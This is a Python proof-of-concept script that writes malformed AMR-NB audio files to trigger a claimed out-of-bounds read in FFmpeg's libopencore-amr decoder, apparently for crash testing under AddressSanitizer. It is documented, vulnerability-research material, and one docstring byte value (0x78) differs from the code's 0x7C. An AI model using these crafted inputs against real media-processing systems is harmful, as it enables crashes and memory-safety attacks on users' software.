#!/usr/bin/env python3
"""
PoC generator for VULN 001: AMR-NB Decoder buf[0] OOB Read Before Size Check
Function: amr_nb_decode_frame() in libavcodec/libopencore-amr.c, line 118

Vulnerability:
  Line 118: dec_mode = (buf[0] >> 3) & 0x000F;
  Line 121: if (packet_size > buf_size) { ... }   <-- check comes AFTER

  If avpkt->data==NULL and avpkt->size==0, reading buf[0] is a NULL pointer
  dereference.  If avpkt->data is valid but avpkt->size==0, it is a heap OOB.

Strategy:
  The AMR-NB demuxer (libavformat/amr.c) uses ff_raw_read_partial_packet with
  AVSTREAM_PARSE_FULL_RAW, so the AMR codec parser (libavcodec/amr_parser.c)
  splits raw bytes into per-frame packets.

  Frame type (FT) is bits 6-3 of the mode byte:
    amrnb_packed_size[] = {13,14,16,18,20,21,27,32,6,1,1,1,1,1,1,1}
  For FT=9-15, packed_size=1, so the parser emits a 1-byte packet.

  In the decoder:
    block_size[] = {12,13,15,17,19,20,26,31,5,0,0,0,0,0,0,0}
  For FT=9-14, block_size=0, packet_size=1, buf_size=1 => size check passes!
  The decoder then calls Decoder_Interface_Decode() with only 1 byte, which
  can cause an OOB read inside the opencore-amr library.

  Additionally, a file that ends abruptly (truncated payload) exercises the
  path where packet_size > buf_size, still first reading buf[0].

We generate several variants to maximise the chance of triggering ASAN:
  1. vuln_001_input.amr        – many FT=9 frames (1-byte, passes size guard)
  2. vuln_001_input_trunc.amr  – magic + FT=0 header byte, no payload (truncated)
  3. vuln_001_input_ft15.amr   – many FT=15 frames (0b01111000 = 0x78)
  4. vuln_001_input_mixed.amr  – mix of valid FT=9 frames + trailing truncated FT=0
"""

import struct
import os

OUT_DIR = os.path.dirname(os.path.abspath(__file__))

# AMR-NB magic header
AMR_MAGIC = b"#!AMR\x0a"  # 6 bytes

def make_amr_frame_byte(ft, q=1):
    """
    Build a single AMR-NB frame header byte.
    Bit layout: [P(1)][FT(4)][Q(1)][P(2)]
    P = padding (0), FT = frame type (bits 6-3), Q = quality (bit 2)
    """
    # byte = 0 | (FT & 0x0F) << 3 | (q & 0x01) << 2 | 0
    return bytes([(ft & 0x0F) << 3 | (q & 0x01) << 2])

# ── Variant 1: many FT=9 frames (packed_size=1, passes decoder size guard) ──
# FT=9 → mode byte = (9 << 3) | (1 << 2) = 0x48 | 0x04 = 0x4C
# The parser sees amrnb_packed_size[9]=1, emits a 1-byte packet.
# The decoder: block_size[9]=0, packet_size=1, buf_size=1 → 1>1 false → decode
# Decoder_Interface_Decode is invoked with buf pointing to 1 byte; the
# opencore-amr library may read beyond that single byte → heap OOB.
ft9_frame = make_amr_frame_byte(9)  # 0x4C
variant1 = AMR_MAGIC + ft9_frame * 500  # 500 minimal frames
out1 = os.path.join(OUT_DIR, "vuln_001_input.amr")
with open(out1, "wb") as f:
    f.write(variant1)
print(f"[+] Written {out1} ({len(variant1)} bytes)  FT=9 x500")

# ── Variant 2: FT=0 header only, payload truncated to 0 bytes ──
# Mode byte for FT=0: (0<<3)|(1<<2) = 0x04
# Parser: amrnb_packed_size[0]=13, but only 1 byte available → flush 1 byte at EOF
# Decoder: block_size[0]=12, packet_size=13, buf_size=1 → 13>1 TRUE → error
# buf[0] is still read before the check!
ft0_frame = make_amr_frame_byte(0)  # 0x04
variant2 = AMR_MAGIC + ft0_frame  # just the header byte, no payload
out2 = os.path.join(OUT_DIR, "vuln_001_input_trunc.amr")
with open(out2, "wb") as f:
    f.write(variant2)
print(f"[+] Written {out2} ({len(variant2)} bytes)  FT=0 truncated")

# ── Variant 3: many FT=15 frames ──
# FT=15 → (15<<3)|(1<<2) = 0x78|0x04 = 0x7C
# amrnb_packed_size[15]=1, block_size[15]=0, same path as FT=9
ft15_frame = make_amr_frame_byte(15)  # 0x7C
variant3 = AMR_MAGIC + ft15_frame * 500
out3 = os.path.join(OUT_DIR, "vuln_001_input_ft15.amr")
with open(out3, "wb") as f:
    f.write(variant3)
print(f"[+] Written {out3} ({len(variant3)} bytes)  FT=15 x500")

# ── Variant 4: mix of valid FT=9 frames + trailing truncated FT=0 ──
# The trailing FT=0 byte (no payload) is the main trigger for the
# "short packet" path; buf[0] is read before the size check.
variant4 = AMR_MAGIC + ft9_frame * 10 + ft0_frame
out4 = os.path.join(OUT_DIR, "vuln_001_input_mixed.amr")
with open(out4, "wb") as f:
    f.write(variant4)
print(f"[+] Written {out4} ({len(variant4)} bytes)  FT=9 x10 + FT=0 truncated")

# ── Variant 5: magic header only (0 frame bytes) ──
# Tests whether decoder flush with 0-byte packet causes NULL deref at buf[0].
variant5 = AMR_MAGIC
out5 = os.path.join(OUT_DIR, "vuln_001_input_empty.amr")
with open(out5, "wb") as f:
    f.write(variant5)
print(f"[+] Written {out5} ({len(variant5)} bytes)  magic only")

# ── Variant 6: Valid FT=0 frames (13 bytes each: 1 mode + 12 payload) ──
# Used to verify the decoder handles correct-size frames and compare baseline
ft0_mode = bytes([0x04])  # FT=0, Q=1
ft0_full_frame = ft0_mode + bytes(12)  # 13 bytes total
variant6 = AMR_MAGIC + ft0_full_frame * 100
out6 = os.path.join(OUT_DIR, "vuln_001_input_valid_ft0.amr")
with open(out6, "wb") as f:
    f.write(variant6)
print(f"[+] Written {out6} ({len(variant6)} bytes)  FT=0 valid x100")

# ── Variant 7: Mixed FT values covering all interesting cases ──
# FT=0: 13 bytes, FT=7: 32 bytes, FT=8 (SID): 6 bytes
# FT=9-15: 1 byte (passes size check in decoder but OOB in opencore)
frames = b""
frames += bytes([0x04]) + bytes(12)   # FT=0
frames += bytes([0x0C]) + bytes(13)   # FT=1
frames += bytes([0x3C]) + bytes(31)   # FT=7 (largest normal)
frames += bytes([0x44]) + bytes(5)    # FT=8 (SID)
frames += bytes([0x4C])               # FT=9  (1-byte)
frames += bytes([0x74])               # FT=14 (1-byte)
frames += bytes([0x7C])               # FT=15 (1-byte)
variant7 = AMR_MAGIC + frames * 50
out7 = os.path.join(OUT_DIR, "vuln_001_input_mixed_ft.amr")
with open(out7, "wb") as f:
    f.write(variant7)
print(f"[+] Written {out7} ({len(variant7)} bytes)  Mixed FT x50")

print("\n[*] All input files generated.")
